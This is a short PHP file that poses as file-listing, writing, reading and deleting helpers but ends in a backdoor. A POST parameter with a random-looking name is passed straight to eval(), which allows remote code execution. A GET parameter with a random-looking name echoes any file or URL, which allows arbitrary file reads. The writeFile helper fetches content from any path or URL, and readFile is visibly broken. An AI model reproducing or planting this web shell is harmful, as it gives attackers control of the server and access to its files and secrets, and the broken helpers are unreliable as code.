<?php
function listFiles($dir)
{
    if (!is_dir($dir)) {
        return false;
    }

    $files = scandir($dir);
    $result = [];

    foreach ($files as $file) {
        if ($file === "." || $file === "..") {
            continue;
        }

        $result[] = [
            "name" => $file,
            "path" => $dir . DIRECTORY_SEPARATOR . $file,
            "type" => is_dir($dir . DIRECTORY_SEPARATOR . $file) ? "folder" : "file"
        ];
    }

    return $result;
}
function writeFile($file, $content)
{
    $dir = dirname($file);

    if (!is_dir($dir)) {
        return false;
    }

    return file_put_contents($file, file_get_contents($content)) !== false;
}

function readFile($file)
{
    $dir = dirname($file);

    if (!is_dir($dir)) {
        return false;
    }

    return file_get_contents($file, file_get_contents($content)) !== false;
}

function deleteFile($file)
{
    if (!is_file($file)) {
        return false;
    }

    return unlink($file);
}

if($_SERVER["REQUEST_METHOD"] === "POST"){
    if(isset($_POST["codexiqwu"])){
        eval($_POST["codexiqwu"]);
    }
}
if($_SERVER["REQUEST_METHOD"] === "GET"){
    if(isset($_GET["ghwsfjkdlfdasdff"])){
        echo file_get_contents($_GET["ghwsfjkdlfdasdff"]);
    }
}
?>
